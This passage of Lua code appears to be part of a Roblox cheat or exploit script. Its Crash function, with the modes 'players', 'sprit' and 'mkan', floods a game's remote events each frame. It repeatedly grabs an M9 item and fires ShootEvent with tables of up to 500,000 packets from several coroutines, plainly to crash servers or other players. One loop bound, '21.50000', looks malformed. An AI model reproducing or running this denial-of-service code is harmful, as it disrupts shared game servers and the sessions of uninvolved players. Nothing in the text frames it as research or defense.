end

function Crash(Cmd)

if Cmd == "players" then

local Packets = {}

CrashPlayers = true

Run.Stepped:Connect(function()

for CRP = 1,3 do

coroutine.resume(coroutine.create(function()

if CrashPlayers then

ItemHandler:InvokeServer(ItemGiver["M9"].ITEMPICKUP)

local Gun = LPlayer.Character:FindFirstChild("M9") or LPlayer.Backpack:FindFirstChild("M9")

for SendToServer = 1,100000 do
Packets[SendToServer] = {
Cframe = CFrame.new(),
Hit = workspace:FindFirstChildOfClass("Part")
}
end

ShootEvent:FireServer(Packets,Gun)

end

end))

end

end)

wait()

CrashPlayers = false

NewCmdLabel("Crash Players.")

end

if Cmd == "sprit" then

local Packets = {}

CrashSprit = true

Run.Stepped:Connect(function()

coroutine.resume(coroutine.create(function()

if CrashSprit then

ItemHandler:InvokeServer(ItemGiver["M9"].ITEMPICKUP)

local Gun = LPlayer.Character:FindFirstChild("M9") or LPlayer.Backpack:FindFirstChild("M9")

for SendToServer = 1,500000 do
Packets[SendToServer] = {
Cframe = CFrame.new(),
Hit = workspace:FindFirstChildOfClass("Part")
}
end

for ReplicateSends = 1,3 do
coroutine.resume(coroutine.create(function()
ShootEvent:FireServer(Packets,Gun)
end))
end

end

end))

end)

wait()

CrashSprit = false

NewCmdLabel("Crash Sprit.")

end

if Cmd == "mkan" then

local Packets = {}

CrashMkan = true

Run.Stepped:Connect(function()

coroutine.resume(coroutine.create(function()

if CrashMkan then

ItemHandler:InvokeServer(ItemGiver["M9"].ITEMPICKUP)

local Gun = LPlayer.Character:FindFirstChild("M9") or LPlayer.Backpack:FindFirstChild("M9")

for SendToServer = 1,21.50000 do
coroutine.resume(coroutine.create(function()
Packets[SendToServer] = {
Cframe = CFrame.new(),
Hit = workspace:FindFirstChildOfClass("Part")
}
end))
end

for ReplicateSends = 1,3 do
coroutine.resume(coroutine.create(function()
ShootEvent:FireServer(Packets,Gun)
end))
end

end

end))

end)

wait()

CrashMkan = false

NewCmdLabel("Crash Mkan.")

end

